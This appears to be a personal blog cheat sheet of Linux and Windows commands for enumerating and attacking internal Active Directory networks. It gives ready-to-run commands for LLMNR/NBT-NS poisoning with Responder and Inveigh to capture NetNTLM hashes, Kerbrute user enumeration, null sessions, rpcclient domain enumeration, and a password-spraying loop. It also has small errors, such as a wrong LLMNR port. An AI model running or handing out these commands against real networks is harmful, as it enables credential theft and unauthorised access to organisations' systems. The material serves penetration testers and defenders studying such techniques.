---
layout: post
title: Commands & Hacks - Enumeration Tricks
toc: true
subtitle: Linux
comments: false
---

<b>Enumeration Tricks:</b> <br>

TCPdump:
```
tcpdump -i <interface>
```

Responder for DNS requests to identify unique hosts

Responder for LLMNR over UDP 5535 OR NBT-NS over UDP 137 to obtain NetNTLM Hash
```
responder -I <interface> -A
```

Fping Active Checking a Subnet:
```
fping -asgq 172.11.5.0/23
```
Enumerate hosts:
```
netdiscover -r <subnet> | awk '{print $1}'
```

Enumerate AD Users with Kerbrute:
```
kerbrute userenum -d <domain_name> --dc <dc_ip> jsmith.txt -o valid_ad_user_accounts
```
Using Inveigh for LLMNR/NBT-NS request poisoning
```
Import-Module .\inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
With valid domain credentials, Using CrackMapExec to obtain the password policy
```
crackmapexec smb 172.10.5.5 -u <user> -p <password> --pass-pol
```
Establishing a null session from windows
```
net use \\DC01\ipc$ "" /u:""
```
View windows account errors:
```
net use \\DC01\ip$ "" /u:guest
```
Internal Password Spraying through Linux:
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <dc> | grep Authority; done
```

Microsoft LAPS Enumeration:
```
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```
If SMB Null sessions, use rpcclient to enumerate AD:
```
rpcclient -U "" -N <dc>
```

RPCClient Enumeration:
```
enumdomusers
queryuser 0x444
```
Find Domain Admins with windapsearch:
```
python3 windapsearch.py --dc-ip <dc_ip> -u user@domain.local -p <password> --da
```
